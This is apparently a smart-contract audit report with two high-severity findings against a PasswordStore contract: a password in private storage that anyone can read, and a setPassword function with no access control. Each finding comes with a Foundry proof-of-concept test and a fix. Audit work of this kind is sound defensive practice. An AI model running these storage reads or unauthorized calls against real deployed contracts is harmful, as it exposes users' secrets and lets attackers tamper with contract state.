### [H-1] Storing private password on-chain making it publicly visible

**Description:** All data stored on-chain is publicly visible and can be read directly from blockchain, even if the variable is private it could be read through direct pointing into it storage slot. Making it not private and misintended the `PasswordStore::getPassword()` function.

**Impact:** Anyone can read the private password, severly breaking the functionality of the protocol.

**Proof of Concept:** Add the following to `PasswordStore.t.sol`
<details>
<summary>Code</summary>

```solidity
function test_any_non_owner_can_see_password() public {
    string memory victimPassword = "mySecretPassword"; // Defines Victim's (Owner's) password
    vm.startPrank(owner); // Simulates Victim's address for the next call
    passwordStore.setPassword(victimPassword); // Victim sets their password

    // At this point, Victim thinks their password is now "privately" stored on the protocol and is completely secret.
    // The exploit code that now follows can be performed by just about everyone on the blockchain who are aware of the Victim's protocol and can access and read the Victim's password.

    /////////// EXPLOIT CODE performed by Attacker ///////////

    // By observing the protocol's source code at `PasswordStore.sol`, we notice that `s_password` is the second storage variable declared in the contract. Since storage slots are alloted in the order of declaration in the EVM, its slot value will be '1'
    uint256 S_PASSWORD_STORAGE_SLOT_VALUE = 1;

    // Access the protocol's storage data at slot 1
    bytes32 slotData = vm.load(
        address(passwordStore),
        bytes32(S_PASSWORD_STORAGE_SLOT_VALUE)
    );

    // Converting `bytes` data to `string`
    string memory anyoneCanReadPassword = string(
        abi.encodePacked(slotData)
    );
    // Exposes Victim's password on console
    console.log(anyoneCanReadPassword);
}

```
</details>

**Recommended Mitigation:** All data on the blockchain is public. To store sensitive information, additional encryption or off-chain solutions should be considered. Sensitive and personal data should never be stored on the blockchain in plaintext or weakly encrypted or encoded format.

### [H-2] `PasswordStore::setPassword()` has no access controls, meaning a non-owner could change the password

**Description:** The `PasswordStore::setPassword()` function is set to be an `external` function, however, the natspec of the function and overall purpose of the contract is that `This function allows only owner to set a new password.`

```solidity
/*
     * @notice This function allows only the owner to set a new password.
     * @param newPassword The new password to set.
     */
@>   //! @audit-high non owner can set the password.
@>    //! Missing access control.
    function setPassword(string memory newPassword) external { 
        s_password = newPassword;
        emit SetNetPassword();
    }
```

**Impact:** Anyone can set/change the password of the contract, breaking the overall logic of the contract.

**Proof of Concept:** Add the following to `PasswordStore.t.sol`
<details>
<summary>Code</summary>

```solidity
    function test_anyone_can_set_password(address randomAddress) public {
        vm.assume(randomAddress != owner);
        vm.prank(randomAddress);
        string memory expectedPassword = "myNewPassword";
        passwordStore.setPassword(expectedPassword);

        vm.prank(owner);
        string memory actualPassword = passwordStore.getPassword();
        assertEq(actualPassword, expectedPassword);
    }
```
</details>

**Recommended Mitigation:** Add an access control conditional to the `setPassword()` function.

```solidity
if (msg.sender != s_owner) {
            revert PasswordStore__NotOwner();
    }
```